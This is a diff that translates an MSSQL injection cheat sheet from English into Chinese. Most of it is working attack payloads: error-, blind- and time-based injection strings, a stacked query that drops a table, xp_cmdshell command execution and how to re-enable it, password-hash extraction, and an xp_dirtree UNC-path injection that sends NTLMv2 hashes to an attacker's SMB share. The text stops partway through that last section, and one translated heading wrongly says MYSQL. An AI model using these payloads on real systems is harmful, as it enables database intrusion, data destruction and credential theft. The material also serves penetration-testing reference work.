@@ -1,50 +1,50 @@
-# MSSQL Injection
+# MSSQL 注入
 
-## Summary
+## 目录
 
-* [MSSQL comments](#mssql-comments)
-* [MSSQL version](#mssql-version)
-* [MSSQL database name](#mssql-database-name)
-* [MSSQL List databases](#mssql-list-database)
-* [MSSQL List columns](#mssql-list-columns)
-* [MSSQL List tables](#mssql-list-tables)
-* [MSSQL Extract user/password](#mssql-extract-user-password)
-* [MSSQL Union Based](#mssql-union-based)
-* [MSSQL Error Based](#mssql-error-based)
-* [MSSQL Blind Based](#mssql-blind-based)
-* [MSSQL Time Based](#mssql-time-based)
-* [MSSQL Stacked query](#mssql-stack-query)
-* [MSSQL Command execution](#mssql-command-execution)
+* [MSSQL注释](#MSSQL注释)
+* [MYSQL版本](#MYSQL版本)
+* [MSSQL数据库名](#MSSQL数据库名)
+* [MSSQL列出数据库](#MSSQL列出数据库)
+* [MSSQL列出列](#MSSQL列出列)
+* [MSSQL列出表](#MSSQL列出表)
+* [MSSQL提取用户名和密码](#MSSQL提取用户名和密码)
+* [MSSQL联合查询](#MSSQL联合查询)
+* [基于MSSQL报错](#基于MSSQL报错)
+* [基于MSSQL盲注](#基于MSSQL盲注)
+* [基于MSSQL时间注入](#基于MSSQL时间注入)
+* [MSSQL堆叠注入](#MSSQL堆叠注入)
+* [MSSQL命令执行](#MSSQL命令执行)
 * [MSSQL UNC path](#mssql-unc-path)
 * [MSSQL Make user DBA](#mssql-make-user-dba)
 
-## MSSQL comments
+## MSSQL注释
 
 ```sql
 -- comment goes here
 /* comment goes here */
 ```
 
-## MSSQL version
+## MYSQL版本
 
 ```sql
 SELECT @@version
 ```
 
-## MSSQL database name
+## MSSQL数据库名
 
 ```sql
 SELECT DB_NAME()
 ```
 
-## MSSQL List databases
+## MSSQL列出数据库
 
 ```sql
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); — for N = 0, 1, 2, …
 ```
 
-## MSSQL List columns
+## MSSQL列出列
 
 ```sql
 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
@@ -53,7 +53,7 @@ SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.
 SELECT table_catalog, column_name FROM information_schema.columns
 ```
 
-## MSSQL List tables
+## MSSQL列出表
 
 ```sql
 SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
@@ -63,7 +63,7 @@ SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.
 SELECT table_catalog, table_name FROM information_schema.columns
 ```
 
-## MSSQL Extract user/password
+## MSSQL提取用户名和密码
 
 ```sql
 MSSQL 2000:
@@ -75,7 +75,7 @@ SELECT name, password_hash FROM master.sys.sql_logins
 SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
-## MSSQL Union Based
+## MSSQL联合查询
 
 ```sql
 -- extract databases names
@@ -99,7 +99,7 @@ $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name =
 $ SELECT  UserId, UserName from Users
 ```
 
-## MSSQL Error based
+## 基于MSSQL报错
 
 ```sql
 For integer inputs : convert(int,@@version)
@@ -109,7 +109,7 @@ For string inputs   : ' + convert(int,@@version) + '
 For string inputs   : ' + cast((SELECT @@version) as int) + '
 ```
 
-## MSSQL Blind based
+## 基于MSSQL盲注
 
 ```sql
 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
@@ -118,7 +118,7 @@ WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_ta
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
 
-## MSSQL Time based
+## 基于MSSQL时间注入
 
 ```sql
 ProductID=1;waitfor delay '0:0:10'--
@@ -130,15 +130,15 @@ ProductID=1));waitfor delay '0:0:10'--
 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
 ```
 
-## MSSQL Stacked Query
+## MSSQL堆叠注入
 
-Use a semi-colon ";" to add another query
+使用分号添加其他查询
 
 ```sql
 ProductID=1; DROP members--
 ```
 
-## MSSQL Command execution
+## MSSQL命令执行
 
 ```sql
 EXEC xp_cmdshell "net user";
@@ -146,7 +146,7 @@ EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
 EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
 
-If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+如果你需要重新激活xp_cmdshell（在SQL server 2005中是默认禁用的）
 
 ```sql
 EXEC sp_configure 'show advanced options',1;
@@ -155,7 +155,7 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```
 
-To interact with the MSSQL instance.
+与MSSQL实例进行交互
 
 ```powershell
 sqsh -S 192.168.1.X -U sa -P superPassword
@@ -164,7 +164,7 @@ python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
 
 ## MSSQL UNC Path
 
-MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
+MSSQL支持堆叠查询，因此我们可以创建一个指向IP地址的变量，然后使用xp_dirtree函数来列出SMB共享中的文件并获取NTLMv2 hash。
 
 ```sql
 1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
